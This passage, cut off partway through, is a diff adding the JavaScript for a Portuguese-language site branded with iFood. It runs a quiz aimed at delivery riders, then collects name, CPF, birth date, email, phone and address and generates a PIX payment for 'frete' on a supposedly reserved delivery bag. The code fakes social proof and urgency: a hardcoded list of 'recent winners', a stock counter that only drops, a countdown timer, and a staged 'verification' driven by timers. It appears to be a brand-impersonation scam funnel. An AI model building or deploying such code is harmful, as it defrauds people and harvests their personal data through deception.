@@ -1,0 +1,1371 @@
+﻿const questions = {
+    start: {
+        id: 'start',
+        text: 'Você já realiza entregas pelo iFood?',
+        options: [
+            { text: 'Sim, já sou parceiro', icon: '🛵', next: 'tempo_atividade' },
+            { text: 'Ainda não, quero começar', icon: '🚀', next: 'possu_veiculo' }
+        ]
+    },
+    tempo_atividade: {
+        id: 'tempo_atividade',
+        text: 'Há quanto tempo você está nas entregas?',
+        options: [
+            { text: 'Estou começando agora', icon: '🌱', next: 'disponibilidade' },
+            { text: 'Menos de 1 ano', icon: '⭐', next: 'disponibilidade' },
+            { text: 'Mais de 1 ano', icon: '🏆', next: 'disponibilidade' }
+        ]
+    },
+    possu_veiculo: {
+        id: 'possu_veiculo',
+        text: 'Você já tem veículo para entregas?',
+        options: [
+            { text: 'Sim, já tenho', icon: '✅', next: 'tipo_veiculo' },
+            { text: 'Estou providenciando', icon: '🛠️', next: 'tipo_veiculo' }
+        ]
+    },
+    tipo_veiculo: {
+        id: 'tipo_veiculo',
+        text: 'Qual será seu principal meio de entrega?',
+        options: [
+            { text: 'Moto', icon: '🏍️', next: 'cnh_status' },
+            { text: 'Bicicleta', icon: '🚲', next: 'disponibilidade' }
+        ]
+    },
+    cnh_status: {
+        id: 'cnh_status',
+        text: 'Qual é a situação da sua CNH?',
+        options: [
+            { text: 'EAR (Atividade remunerada)', icon: '✅', next: 'disponibilidade' },
+            { text: 'CNH comum (sem EAR)', icon: '⚠️', next: 'disponibilidade' },
+            { text: 'Provisória', icon: '🔰', next: 'disponibilidade' }
+        ]
+    },
+    disponibilidade: {
+        id: 'disponibilidade',
+        text: 'Quantas horas por dia você pretende ficar online?',
+        options: [
+            { text: 'Até 4 horas', icon: '⏱️', next: 'objetivo_renda' },
+            { text: '4 a 8 horas', icon: '💼', next: 'objetivo_renda' },
+            { text: 'Mais de 8 horas', icon: '🚀', next: 'objetivo_renda' }
+        ]
+    },
+    objetivo_renda: {
+        id: 'objetivo_renda',
+        text: 'Qual é seu objetivo com as entregas?',
+        options: [
+            { text: 'Renda extra', icon: '💡', next: 'regiao_preferencia' },
+            { text: 'Renda principal', icon: '📈', next: 'regiao_preferencia' },
+            { text: 'Quero crescer rápido', icon: '🔥', next: 'regiao_preferencia' }
+        ]
+    },
+    regiao_preferencia: {
+        id: 'regiao_preferencia',
+        text: 'Onde você prefere atuar?',
+        options: [
+            { text: 'Centro e arredores', icon: '🏙️', next: 'equipamento' },
+            { text: 'Bairros residenciais', icon: '🏡', next: 'equipamento' },
+            { text: 'Próximo a shoppings', icon: '🛍️', next: 'equipamento' }
+        ]
+    },
+    equipamento: {
+        id: 'equipamento',
+        text: 'Você já tem bag térmica em boas condições?',
+        options: [
+            { text: 'Sim, mas preciso trocar', icon: '♻️', next: 'horario_pico' },
+            { text: 'Não tenho, preciso da primeira', icon: '🎒', next: 'horario_pico' },
+            { text: 'Tenho e quero uma reserva', icon: '✅', next: 'horario_pico' }
+        ]
+    },
+    horario_pico: {
+        id: 'horario_pico',
+        text: 'Você consegue rodar em horários de pico (almoço/jantar)?',
+        options: [
+            { text: 'Sim, com certeza', icon: '🔥', next: 'personal_step' },
+            { text: 'Consigo às vezes', icon: '📅', next: 'personal_step' },
+            { text: 'Prefiro horários alternativos', icon: '🌙', next: 'personal_step' }
+        ]
+    }
+};
+
+const winners = [
+    'Carlos M. - SP - Resgatou há 2 min',
+    'Ana P. - RJ - Resgatou há 5 min',
+    'Roberto S. - MG - Resgatou há 12 min',
+    'Felipe K. - RS - Resgatou há 15 min'
+];
+
+const STORAGE_KEYS = {
+    personal: 'ifoodbag.personal',
+    address: 'ifoodbag.address',
+    quizComplete: 'ifoodbag.quizComplete',
+    stage: 'ifoodbag.stage',
+    stock: 'ifoodbag.stock',
+    returnTo: 'ifoodbag.returnTo',
+    shipping: 'ifoodbag.shipping',
+    addressExtra: 'ifoodbag.addressExtra',
+    pix: 'ifoodbag.pix'
+};
+
+const state = {
+    currentQuestionKey: 'start',
+    currentStepIndex: 1,
+    totalSteps: 0,
+    answerLocked: false,
+    timerId: null,
+    tickerId: null,
+    toastTimeout: null
+};
+
+const dom = {};
+const pathMemo = {};
+
+document.addEventListener('DOMContentLoaded', () => {
+    cacheCommonDom();
+    initStockCounter();
+
+    const page = document.body.dataset.page || '';
+    switch (page) {
+        case 'home':
+            initHome();
+            break;
+        case 'quiz':
+            initQuiz();
+            break;
+        case 'personal':
+            initPersonal();
+            break;
+        case 'cep':
+            initCep();
+            break;
+        case 'processing':
+            initProcessing();
+            break;
+        case 'success':
+            initSuccess();
+            break;
+        case 'checkout':
+            initCheckout();
+            break;
+        case 'pix':
+            initPix();
+            break;
+        default:
+            break;
+    }
+});
+
+function cacheCommonDom() {
+    dom.stockCounter = document.getElementById('stock-counter');
+    dom.toast = document.getElementById('toast');
+}
+
+function initHome() {
+    const btnStart = document.getElementById('btn-start');
+
+    btnStart?.addEventListener('click', () => {
+        resetFlow();
+        setStage('quiz');
+        redirect('quiz.html');
+    });
+}
+
+function initQuiz() {
+    const currentStage = getStage();
+    if (!currentStage || currentStage === 'quiz' || currentStage === 'personal') {
+        setStage('quiz');
+    }
+
+    const questionText = document.getElementById('question-text');
+    const optionsContainer = document.getElementById('options-container');
+    const questionCount = document.getElementById('question-count');
+    const progressFill = document.getElementById('progress-fill');
+
+    if (!questionText || !optionsContainer || !questionCount || !progressFill) return;
+
+    state.currentQuestionKey = 'start';
+    state.currentStepIndex = 1;
+    state.totalSteps = maxPathLengthFrom('start');
+    state.answerLocked = false;
+
+    renderQuestion(questions.start, {
+        questionText,
+        optionsContainer,
+        questionCount,
+        progressFill
+    });
+}
+
+function initPersonal() {
+    setStage('personal');
+    const returnTo = getReturnTarget();
+
+    const form = document.getElementById('personal-form');
+    const fullname = document.getElementById('fullname');
+    const cpf = document.getElementById('cpf');
+    const email = document.getElementById('email');
+    const phone = document.getElementById('phone');
+    const birthdate = document.getElementById('birthdate');
+    const errorBox = document.getElementById('personal-error');
+
+    const personal = loadPersonal();
+    if (personal) {
+        if (fullname) fullname.value = personal.name || '';
+        if (cpf) cpf.value = personal.cpf || '';
+        if (email) email.value = personal.email || '';
+        if (phone) phone.value = personal.phone || '';
+        if (birthdate) birthdate.value = personal.birth || '';
+    }
+
+    cpf?.addEventListener('input', () => maskCPF(cpf));
+    phone?.addEventListener('input', () => maskPhone(phone));
+    birthdate?.addEventListener('input', () => maskDate(birthdate));
+
+    form?.addEventListener('submit', (event) => {
+        event.preventDefault();
+        clearInlineError(errorBox);
+
+        const nameValue = fullname?.value.trim() || '';
+        const cpfValue = cpf?.value.trim() || '';
+        const emailValue = email?.value.trim() || '';
+        const phoneValue = phone?.value.trim() || '';
+        const birthValue = birthdate?.value.trim() || '';
+
+        if (nameValue.length < 3) {
+            showInlineError(errorBox, 'Por favor, digite seu nome completo.');
+            return;
+        }
+
+        if (!isValidDate(birthValue)) {
+            showInlineError(errorBox, 'Digite uma data válida (DD/MM/AAAA).');
+            return;
+        }
+
+        if (!validateCPF(cpfValue)) {
+            showInlineError(errorBox, 'CPF inválido. Verifique os números digitados.');
+            return;
+        }
+
+        if (!isValidEmail(emailValue)) {
+            showInlineError(errorBox, 'Digite um e-mail válido.');
+            return;
+        }
+
+        if (!isValidPhone(phoneValue)) {
+            showInlineError(errorBox, 'Digite um telefone válido com DDD.');
+            return;
+        }
+
+        savePersonal({
+            name: nameValue,
+            cpf: cpfValue,
+            birth: birthValue,
+            email: emailValue,
+            phone: phoneValue,
+            phoneDigits: phoneValue.replace(/\D/g, '')
+        });
+
+        if (returnTo === 'checkout' && loadAddress()) {
+            sessionStorage.removeItem(STORAGE_KEYS.returnTo);
+            setStage('checkout');
+            redirect('checkout.html');
+            return;
+        }
+
+        setStage('cep');
+        redirect('endereco.html');
+    });
+
+    focusFirstControl(form);
+}
+
+function initCep() {
+    if (!requirePersonal()) return;
+    setStage('cep');
+    const returnTo = getReturnTarget();
+
+    const cepInput = document.getElementById('cep-input');
+    const errorBox = document.getElementById('cep-error');
+    const btnBuscar = document.getElementById('btn-buscar-cep');
+    const loadingRow = document.getElementById('cep-loading');
+    const addressResult = document.getElementById('address-result');
+    const addrStreet = document.getElementById('addr-street');
+    const addrCity = document.getElementById('addr-city');
+    const freightBox = document.getElementById('freight-calculation');
+    const btnConfirm = document.getElementById('btn-confirm-address');
+
+    const savedAddress = loadAddress();
+    if (savedAddress && cepInput) {
+        cepInput.value = savedAddress.cep || '';
+        if (addrStreet) addrStreet.innerText = savedAddress.streetLine || '';
+        if (addrCity) addrCity.innerText = savedAddress.cityLine || '';
+        setHidden(addressResult, false);
+        setHidden(freightBox, false);
+        btnBuscar?.classList.add('hidden');
+    }
+
+    cepInput?.addEventListener('input', () => {
+        maskCep(cepInput);
+        resetCepResults(errorBox, addressResult, freightBox, btnBuscar, loadingRow);
+    });
+
+    btnBuscar?.addEventListener('click', async () => {
+        if (!cepInput) return;
+        clearInlineError(errorBox);
+
+        const rawCep = cepInput.value.replace(/\D/g, '');
+        if (rawCep.length !== 8) {
+            showInlineError(errorBox, 'Por favor, digite um CEP válido.');
+            return;
+        }
+
+        const minDelayMs = 1200;
+        const startTime = Date.now();
+
+        btnBuscar.innerText = 'Consultando...';
+        btnBuscar.disabled = true;
+        setHidden(loadingRow, false);
+
+        try {
+            const response = await fetch(`https://brasilapi.com.br/api/cep/v1/${rawCep}`);
+            if (!response.ok) throw new Error('CEP não encontrado');
+
+            const data = await response.json();
+            const street = (data.street || '').trim();
+            const neighborhood = (data.neighborhood || '').trim();
+            const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua não informada';
+            const city = (data.city || 'Cidade não informada').trim();
+            const stateUf = (data.state || '').trim();
+            const cityLine = stateUf ? `${city} - ${stateUf}` : city;
+
+            if (addrStreet) addrStreet.innerText = streetLine;
+            if (addrCity) addrCity.innerText = cityLine;
+
+            saveAddress({
+                streetLine,
+                cityLine,
+                cep: formatCep(rawCep),
+                street,
+                neighborhood,
+                city,
+                state: stateUf
+            });
+
+            const elapsed = Date.now() - startTime;
+            const remaining = Math.max(0, minDelayMs - elapsed);
+
+            setTimeout(() => {
+                setHidden(loadingRow, true);
+                setHidden(addressResult, false);
+                setHidden(freightBox, false);
+                btnBuscar.classList.add('hidden');
+                btnBuscar.innerText = 'Verificar disponibilidade';
+                btnBuscar.disabled = false;
+            }, remaining);
+        } catch (error) {
+            const elapsed = Date.now() - startTime;
+            const remaining = Math.max(0, minDelayMs - elapsed);
+
+            setTimeout(() => {
+                setHidden(loadingRow, true);
+                showInlineError(errorBox, 'CEP não encontrado. Tente novamente.');
+                btnBuscar.innerText = 'Verificar disponibilidade';
+                btnBuscar.disabled = false;
+            }, remaining);
+        }
+    });
+
+    btnConfirm?.addEventListener('click', () => {
+        if (!loadAddress()) {
+            showInlineError(errorBox, 'Confirme o CEP para continuar.');
+            return;
+        }
+        if (returnTo === 'checkout') {
+            sessionStorage.removeItem(STORAGE_KEYS.returnTo);
+            setStage('checkout');
+            redirect('checkout.html');
+            return;
+        }
+        setStage('processing');
+        redirect('processando.html');
+    });
+
+    focusFirstControl(document.querySelector('.step'));
+}
+
+function initProcessing() {
+    if (!requirePersonal()) return;
+    if (!requireAddress()) return;
+
+    setStage('processing');
+
+    const textEl = document.getElementById('processing-text');
+    const videoEl = document.getElementById('vsl-video');
+    const spinnerEl = document.getElementById('processing-spinner');
+    const verifiedEl = document.getElementById('processing-verified');
+    const frameEl = document.getElementById('vsl-frame');
+    const loadingTexts = [
+        'Verificando estoque regional...',
+        'Validando dados da solicitação...',
+        'Confirmando prioridade na fila...',
+        'Finalizando sua solicitação...'
+    ];
+
+    let verificationTimer = null;
+    let finishTimer = null;
+    let timelineStarted = false;
+    let finishTriggered = false;
+
+    const updateText = (txt) => {
+        if (!textEl) return;
+        textEl.style.opacity = 0;
+        setTimeout(() => {
+            textEl.innerText = txt;
+            textEl.style.opacity = 1;
+        }, 200);
+    };
+
+    const startTimeline = (durationMs) => {
+        if (timelineStarted) return;
+        timelineStarted = true;
+
+        const stepInterval = Math.max(800, durationMs / loadingTexts.length);
+        loadingTexts.forEach((txt, index) => {
+            setTimeout(() => updateText(txt), index * stepInterval);
+        });
+
+        verificationTimer = setTimeout(() => finishVerification(), durationMs);
+    };
+
+    const finishVerification = () => {
+        if (finishTriggered) return;
+        finishTriggered = true;
+
+        if (verificationTimer) {
+            clearTimeout(verificationTimer);
+        }
+
+        finishTimer = setTimeout(() => {
+            if (spinnerEl) spinnerEl.classList.add('hidden');
+            if (verifiedEl) {
+                verifiedEl.classList.remove('hidden');
+                verifiedEl.setAttribute('aria-hidden', 'false');
+            }
+            updateText('Verificação concluída.');
+
+            setTimeout(() => {
+                setStage('success');
+                redirect('sucesso.html');
+            }, 900);
+        }, 2000);
+    };
+
+    if (videoEl) {
+        const safeStart = () => {
+            const durationMs = Number.isFinite(videoEl.duration) && videoEl.duration > 0
+                ? videoEl.duration * 1000
+                : 30000;
+            startTimeline(durationMs);
+        };
+
+        videoEl.addEventListener('loadedmetadata', safeStart);
+        if (videoEl.readyState >= 1) safeStart();
+
+        videoEl.addEventListener('ended', finishVerification);
+
+        const playPromise = videoEl.play();
+        if (playPromise && typeof playPromise.catch === 'function') {
+            playPromise.catch(() => {
+                safeStart();
+            });
+        }
+    } else {
+        startTimeline(30000);
+    }
+}
+
+function initSuccess() {
+    if (!requirePersonal()) return;
+    if (!requireAddress()) return;
+
+    setStage('success');
+
+    const personal = loadPersonal();
+    const leadName = document.getElementById('lead-name');
+    const timer = document.getElementById('timer');
+    const ticker = document.getElementById('ticker');
+    const btnCheckout = document.getElementById('btn-checkout');
+
+    if (leadName && personal?.name) {
+        const firstName = personal.name.trim().split(/\s+/)[0];
+        leadName.textContent = firstName || personal.name;
+    }
+
+    startTimer(300, timer);
+    startTicker(ticker);
+
+    btnCheckout?.addEventListener('click', () => {
+        setStage('checkout');
+        redirect('checkout.html');
+    });
+}
+
+function initCheckout() {
+    if (!requirePersonal()) return;
+    if (!requireAddress()) return;
+
+    setStage('checkout');
+    sessionStorage.removeItem(STORAGE_KEYS.returnTo);
+
+    const personal = loadPersonal();
+    let address = loadAddress();
+    let shipping = loadShipping();
+
+    const summaryName = document.getElementById('summary-name');
+    const summaryCpf = document.getElementById('summary-cpf');
+    const summaryBirth = document.getElementById('summary-birth');
+    const summaryAddress = document.getElementById('summary-address');
+    const summaryCep = document.getElementById('summary-cep');
+    const summaryBlock = document.getElementById('summary-block');
+    const freightForm = document.getElementById('freight-form');
+    const checkoutCep = document.getElementById('checkout-cep');
+    const btnCalcFreight = document.getElementById('btn-calc-freight');
+    const btnVerifyFreight = document.getElementById('btn-verify-freight');
+    const freightLoading = document.getElementById('freight-loading');
+    const freightAddress = document.getElementById('freight-address');
+    const freightStreet = document.getElementById('freight-street');
+    const freightCity = document.getElementById('freight-city');
+    const freightDetails = document.getElementById('freight-details');
+    const addrNumber = document.getElementById('addr-number');
+    const noNumber = document.getElementById('no-number');
+    const addrComplement = document.getElementById('addr-complement');
+    const noComplement = document.getElementById('no-complement');
+    const addrReference = document.getElementById('addr-reference');
+    const freightOptions = document.getElementById('freight-options');
+    const freightHint = document.getElementById('freight-hint');
+    const shippingTotal = document.getElementById('shipping-total');
+    const btnFinish = document.getElementById('btn-finish');
+
+    if (summaryName) summaryName.textContent = personal?.name || '-';
+    if (summaryCpf) summaryCpf.textContent = personal?.cpf || '-';
+    if (summaryBirth) summaryBirth.textContent = personal?.birth || '-';
+    const formatSummaryAddress = () => {
+        const base = address?.streetLine || '-';
+        const city = address?.cityLine || '-';
+        const extra = loadAddressExtra();
+        const numberValue = (extra?.number || '').trim();
+        const numberText = extra?.noNumber ? 's/n' : numberValue;
+        const streetWithNumber = numberText ? `${base}, ${numberText}` : base;
+        return `${streetWithNumber} · ${city}`;
+    };
+
+    const updateSummaryAddress = () => {
+        if (!summaryAddress) return;
+        summaryAddress.textContent = formatSummaryAddress();
+    };
+
+    updateSummaryAddress();
+    if (summaryCep) summaryCep.textContent = address?.cep || '-';
+
+    if (checkoutCep) {
+        checkoutCep.value = address?.cep || '';
+        checkoutCep.addEventListener('input', () => maskCep(checkoutCep));
+    }
+
+    let cachedOptions = null;
+    let cachedSelectedId = null;
+
+    const isExtraValid = () => {
+        const numberOk = !!(noNumber?.checked || (addrNumber?.value || '').trim().length);
+        const complementOk = !!(noComplement?.checked || (addrComplement?.value || '').trim().length);
+        return numberOk && complementOk;
+    };
+
+    const renderOptions = (options, selectedId) => {
+        if (!freightOptions) return;
+        freightOptions.innerHTML = '';
+        options.forEach((opt) => {
+            const label = document.createElement('label');
+            label.className = 'freight-option';
+            if (opt.id === selectedId) label.classList.add('freight-option--active');
+            label.innerHTML = `
+                <input type="radio" name="shipping" value="${opt.id}" ${opt.id === selectedId ? 'checked' : ''}>
+                <div class="freight-option__main">
+                    <div class="freight-option__title">${opt.name}</div>
+                    <div class="freight-option__eta">${opt.eta}</div>
+                </div>
+                <div class="freight-option__price">${formatCurrency(opt.price)}</div>
+            `;
+            label.addEventListener('click', () => {
+                selectShipping(opt, options);
+            });
+            freightOptions.appendChild(label);
+        });
+    };
+
+    const showFreightSelection = () => {
+        if (!cachedOptions || !freightOptions) return;
+        renderOptions(cachedOptions, cachedSelectedId);
+        setHidden(freightOptions, false);
+        setHidden(freightHint, false);
+    };
+
+    const updateFreightAddress = (addr) => {
+        if (!freightAddress) return;
+        if (freightStreet) freightStreet.textContent = addr?.streetLine || 'Rua não informada';
+        if (freightCity) freightCity.textContent = addr?.cityLine || 'Cidade não informada';
+        setHidden(freightAddress, false);
+    };
+
+    const hydrateExtraAddress = () => {
+        const extra = loadAddressExtra();
+        if (addrNumber) addrNumber.value = extra?.number || '';
+        if (addrComplement) addrComplement.value = extra?.complement || '';
+        if (addrReference) addrReference.value = extra?.reference || '';
+        if (noNumber) noNumber.checked = !!extra?.noNumber;
+        if (noComplement) noComplement.checked = !!extra?.noComplement;
+
+        if (noNumber && addrNumber) {
+            addrNumber.disabled = noNumber.checked;
+            addrNumber.classList.toggle('input-dim', noNumber.checked);
+        }
+        if (noComplement && addrComplement) {
+            addrComplement.disabled = noComplement.checked;
+            addrComplement.classList.toggle('input-dim', noComplement.checked);
+        }
+    };
+
+    let extraBound = false;
+    const bindExtraAddress = () => {
+        if (extraBound) return;
+        extraBound = true;
+        if (noNumber && addrNumber) {
+            noNumber.addEventListener('change', () => {
+                addrNumber.disabled = noNumber.checked;
+                addrNumber.classList.toggle('input-dim', noNumber.checked);
+                saveAddressExtra(collectExtraAddress());
+                updateSummaryAddress();
+            });
+        }
+        if (noComplement && addrComplement) {
+            noComplement.addEventListener('change', () => {
+                addrComplement.disabled = noComplement.checked;
+                addrComplement.classList.toggle('input-dim', noComplement.checked);
+                saveAddressExtra(collectExtraAddress());
+                updateSummaryAddress();
+            });
+        }
+        [addrNumber, addrComplement, addrReference].forEach((input) => {
+            input?.addEventListener('input', () => {
+                saveAddressExtra(collectExtraAddress());
+                updateSummaryAddress();
+            });
+        });
+    };
+
+    const collectExtraAddress = () => ({
+        number: addrNumber?.value.trim() || '',
+        complement: addrComplement?.value.trim() || '',
+        reference: addrReference?.value.trim() || '',
+        noNumber: !!noNumber?.checked,
+        noComplement: !!noComplement?.checked
+    });
+
+    const selectShipping = (opt, options) => {
+        saveShipping(opt);
+        cachedSelectedId = opt.id;
+        shipping = opt;
+        if (shippingTotal) {
+            shippingTotal.querySelector('strong').textContent = formatCurrency(opt.price);
+            setHidden(shippingTotal, false);
+        }
+        if (btnFinish) {
+            btnFinish.classList.remove('hidden');
+        }
+        const labels = freightOptions?.querySelectorAll('.freight-option') || [];
+        labels.forEach((label) => {
+            label.classList.toggle('freight-option--active', label.querySelector('input')?.value === opt.id);
+        });
+    };
+
+    const clearShippingSelection = () => {
+        localStorage.removeItem(STORAGE_KEYS.shipping);
+        cachedSelectedId = '';
+        if (freightOptions) freightOptions.innerHTML = '';
+        setHidden(freightOptions, true);
+        setHidden(freightHint, true);
+        setHidden(shippingTotal, true);
+        if (btnFinish) btnFinish.classList.add('hidden');
+    };
+
+    const calcShipping = () => {
+        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
+        if (rawCep.length !== 8) {
+            showToast('Digite um CEP válido para calcular o frete.', 'error');
+            return;
+        }
+
+        clearShippingSelection();
+        if (btnCalcFreight) {
+            btnCalcFreight.disabled = true;
+        }
+        setHidden(freightLoading, false);
+        setHidden(freightAddress, true);
+        setHidden(freightOptions, true);
+        setHidden(shippingTotal, true);
+        if (btnFinish) btnFinish.classList.add('hidden');
+
+        if (summaryCep) summaryCep.textContent = formatCep(rawCep);
+
+        const startTime = Date.now();
+        const minDelay = 900;
+
+        fetch(`https://brasilapi.com.br/api/cep/v1/${rawCep}`)
+            .then((res) => {
+                if (!res.ok) throw new Error('CEP não encontrado');
+                return res.json();
+            })
+            .then((data) => {
+                const street = (data.street || '').trim();
+                const neighborhood = (data.neighborhood || '').trim();
+                const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua não informada';
+                const city = (data.city || 'Cidade não informada').trim();
+                const stateUf = (data.state || '').trim();
+                const cityLine = stateUf ? `${city} - ${stateUf}` : city;
+
+                const updatedAddress = {
+                    ...(address || {}),
+                    streetLine,
+                    cityLine,
+                    cep: formatCep(rawCep),
+                    street,
+                    neighborhood,
+                    city,
+                    state: stateUf
+                };
+
+                saveAddress(updatedAddress);
+                if (address) {
+                    address.streetLine = updatedAddress.streetLine;
+                    address.cityLine = updatedAddress.cityLine;
+                    address.cep = updatedAddress.cep;
+                } else {
+                    address = updatedAddress;
+                }
+                updateSummaryAddress();
+                updateFreightAddress(updatedAddress);
+                setHidden(freightDetails, false);
+                setHidden(summaryBlock, true);
+                setHidden(freightForm, false);
+                hydrateExtraAddress();
+                bindExtraAddress();
+
+                const options = buildShippingOptions(rawCep);
+                cachedOptions = options;
+                cachedSelectedId = '';
+                if (freightOptions) freightOptions.innerHTML = '';
+
+                const elapsed = Date.now() - startTime;
+                const remaining = Math.max(0, minDelay - elapsed);
+                setTimeout(() => {
+                    setHidden(freightLoading, true);
+                    setHidden(freightLoading, true);
+                    if (btnCalcFreight) {
+                        btnCalcFreight.disabled = false;
+                    }
+                }, remaining);
+            })
+            .catch(() => {
+                const elapsed = Date.now() - startTime;
+                const remaining = Math.max(0, minDelay - elapsed);
+                setTimeout(() => {
+                    showToast('CEP não encontrado. Verifique e tente novamente.', 'error');
+                    setHidden(freightLoading, true);
+                    if (btnCalcFreight) {
+                        btnCalcFreight.disabled = false;
+                    }
+                }, remaining);
+            });
+    };
+
+    btnCalcFreight?.addEventListener('click', calcShipping);
+
+    btnVerifyFreight?.addEventListener('click', () => {
+        setHidden(freightForm, true);
+        setHidden(summaryBlock, false);
+        showFreightSelection();
+    });
+
+    if (shipping && freightOptions) {
+        cachedOptions = buildShippingOptions((checkoutCep?.value || '').replace(/\D/g, ''));
+        cachedSelectedId = shipping.id;
+        setHidden(summaryBlock, false);
+        setHidden(freightForm, true);
+        showFreightSelection();
+        if (shippingTotal) {
+            shippingTotal.querySelector('strong').textContent = formatCurrency(shipping.price);
+            setHidden(shippingTotal, false);
+        }
+        if (btnFinish) btnFinish.classList.remove('hidden');
+    }
+
+    if (!shipping) {
+        hydrateExtraAddress();
+        bindExtraAddress();
+    }
+
+    btnFinish?.addEventListener('click', () => {
+        if (!btnFinish) return;
+        if (!shipping) {
+            showToast('Selecione um frete para continuar.', 'error');
+            return;
+        }
+
+        btnFinish.disabled = true;
+        const originalText = btnFinish.textContent;
+        btnFinish.textContent = 'Gerando PIX...';
+
+        const payload = {
+            amount: shipping.price,
+            shipping,
+            personal: loadPersonal(),
+            address: loadAddress(),
+            extra: loadAddressExtra()
+        };
+
+        fetch('/api/pix/create', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+            .then(async (res) => {
+                const data = await res.json().catch(() => ({}));
+                if (!res.ok) {
+                    const message = data?.error || 'Não foi possível gerar o pagamento PIX.';
+                    throw new Error(message);
+                }
+                savePix({
+                    ...data,
+                    amount: shipping.price,
+                    shippingName: shipping.name,
+                    createdAt: Date.now()
+                });
+                setStage('pix');
+                redirect('pix.html');
+            })
+            .catch((error) => {
+                showToast(error.message || 'Erro ao gerar o PIX. Tente novamente.', 'error');
+                btnFinish.disabled = false;
+                btnFinish.textContent = originalText || 'Finalizar Pedido';
+            });
+    });
+}
+
+function initPix() {
+    const pix = loadPix();
+    const pixQr = document.getElementById('pix-qr');
+    const pixCode = document.getElementById('pix-code');
+    const pixAmount = document.getElementById('pix-amount');
+    const pixStatus = document.getElementById('pix-status');
+    const pixEmpty = document.getElementById('pix-empty');
+    const pixCard = document.getElementById('pix-card');
+    const btnCopy = document.getElementById('btn-copy-pix');
+
+    if (!pix) {
+        if (pixEmpty) pixEmpty.classList.remove('hidden');
+        if (pixCard) pixCard.classList.add('hidden');
+        return;
+    }
+
+    if (pixAmount) pixAmount.textContent = formatCurrency(pix.amount || 0);
+    if (pixStatus) pixStatus.textContent = 'Aguardando pagamento do frete.';
+    if (pixCode) pixCode.value = pix.paymentCode || '';
+
+    if (pixQr && pix.paymentCodeBase64) {
+        const base64 = pix.paymentCodeBase64;
+        pixQr.src = base64.startsWith('data:image') ? base64 : `data:image/png;base64,${base64}`;
+    }
+
+    btnCopy?.addEventListener('click', async () => {
+        if (!pixCode) return;
+        const value = pixCode.value || '';
+        if (!value) return;
+        try {
+            await navigator.clipboard.writeText(value);
+            btnCopy.textContent = 'Copiado!';
+            setTimeout(() => {
+                btnCopy.textContent = 'Copiar';
+            }, 1600);
+        } catch (error) {
+            pixCode.select();
+            document.execCommand('copy');
+            btnCopy.textContent = 'Copiado!';
+            setTimeout(() => {
+                btnCopy.textContent = 'Copiar';
+            }, 1600);
+        }
+    });
+}
+
+function renderQuestion(questionConfig, refs) {
+    const { questionText, optionsContainer, questionCount, progressFill } = refs;
+
+    questionText.innerText = questionConfig.text;
+    optionsContainer.innerHTML = '';
+
+    questionConfig.options.forEach((opt) => {
+        const btn = document.createElement('button');
+        btn.type = 'button';
+        btn.className = 'option-btn';
+        btn.innerHTML = `<span class="icon">${opt.icon}</span> ${opt.text}`;
+        btn.addEventListener('click', () => handleAnswer(btn, opt, refs));
+        optionsContainer.appendChild(btn);
+    });
+
+    updateProgress(questionCount, progressFill);
+    const firstBtn = optionsContainer.querySelector('button');
+    firstBtn?.focus();
+}
+
+function handleAnswer(btnElement, option, refs) {
+    if (state.answerLocked) return;
+    state.answerLocked = true;
+
+    const allBtns = document.querySelectorAll('.option-btn');
+    allBtns.forEach((b) => {
+        b.classList.remove('selected');
+        b.disabled = true;
+    });
+
+    btnElement.classList.add('selected');
+
+    setTimeout(() => {
+        if (option.next === 'personal_step') {
+            saveQuizComplete();
+            setStage('personal');
+            redirect('dados.html');
+            return;
+        }
+
+        state.currentStepIndex += 1;
+        state.currentQuestionKey = option.next;
+        state.totalSteps = Math.max(
+            state.currentStepIndex,
+            (state.currentStepIndex - 1) + maxPathLengthFrom(state.currentQuestionKey)
+        );
+
+        if (!questions[state.currentQuestionKey]) {
+            showToast('Ocorreu um erro ao carregar a próxima pergunta.', 'error');
+            state.answerLocked = false;
+            return;
+        }
+
+        renderQuestion(questions[state.currentQuestionKey], refs);
+        state.answerLocked = false;
+    }, 300);
+}
+
+function updateProgress(questionCount, progressFill) {
+    const total = Math.max(state.totalSteps, state.currentStepIndex);
+    questionCount.innerText = `PERGUNTA ${state.currentStepIndex} DE ${total}`;
+    const progressPct = (state.currentStepIndex / total) * 100;
+    progressFill.style.width = `${Math.min(progressPct, 100)}%`;
+}
+
+function maxPathLengthFrom(key) {
+    if (!key || key === 'personal_step') return 0;
+    if (pathMemo[key]) return pathMemo[key];
+    const q = questions[key];
+    if (!q || !Array.isArray(q.options) || q.options.length === 0) return 0;
+    const maxNext = Math.max(...q.options.map((opt) => maxPathLengthFrom(opt.next)));
+    const length = 1 + (Number.isFinite(maxNext) ? maxNext : 0);
+    pathMemo[key] = length;
+    return length;
+}
+
+function initStockCounter() {
+    if (!dom.stockCounter) return;
+    const stored = Number(sessionStorage.getItem(STORAGE_KEYS.stock) || 8);
+    let stock = Number.isFinite(stored) && stored > 0 ? stored : 8;
+
+    dom.stockCounter.innerText = stock;
+
+    const tick = () => {
+        if (stock > 3) {
+            stock -= 1;
+            sessionStorage.setItem(STORAGE_KEYS.stock, String(stock));
+            dom.stockCounter.innerText = stock;
+            dom.stockCounter.style.color = '#ffeb3b';
+            setTimeout(() => {
+                dom.stockCounter.style.color = 'white';
+            }, 500);
+            setTimeout(tick, Math.random() * 8000 + 4000);
+        }
+    };
+
+    setTimeout(tick, 5000);
+}
+
+function maskCPF(input) {
+    if (!input) return;
+    let v = input.value.replace(/\D/g, '');
+    if (v.length > 11) v = v.slice(0, 11);
+    v = v.replace(/(\d{3})(\d)/, '$1.$2');
+    v = v.replace(/(\d{3})(\d)/, '$1.$2');
+    v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+    input.value = v;
+}
+
+function maskDate(input) {
+    if (!input) return;
+    let v = input.value.replace(/\D/g, '');
+    if (v.length > 8) v = v.slice(0, 8);
+    v = v.replace(/(\d{2})(\d)/, '$1/$2');
+    v = v.replace(/(\d{2})(\d)/, '$1/$2');
+    input.value = v;
+}
+
+function maskPhone(input) {
+    if (!input) return;
+    let v = input.value.replace(/\D/g, '');
+    if (v.length > 11) v = v.slice(0, 11);
+    if (v.length <= 2) {
+        input.value = v;
+        return;
+    }
+    if (v.length <= 6) {
+        input.value = `(${v.slice(0, 2)}) ${v.slice(2)}`;
+        return;
+    }
